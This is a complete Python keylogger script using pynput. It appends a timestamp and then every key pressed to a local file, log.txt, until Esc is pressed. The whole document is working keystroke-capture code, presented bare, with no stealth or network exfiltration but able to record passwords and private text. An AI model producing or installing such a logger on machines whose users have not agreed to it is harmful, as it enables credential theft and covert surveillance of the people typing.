import time
import pynput 
from pynput.keyboard import Key, Listener 
date = time.ctime()
with open('log.txt', 'a') as f:
    f.write('\n')
    f.write(str(date))
    f.write('\n') 

def on_press(keys):
    write_file(keys)
    
def write_file(keys): 
    with open('log.txt', 'a') as f: 
        # removing '' 
        k = str(keys).replace("'", "") 
        f.write(k)
                    
        # explicitly adding a space after  
        # every keystroke for readability 
        f.write(' ')    
def on_release(key):    
    if key == Key.esc: 
        # Stop listener 
        return False
   
   
with Listener(on_press = on_press, 
              on_release = on_release) as listener: 
                      
    listener.join() 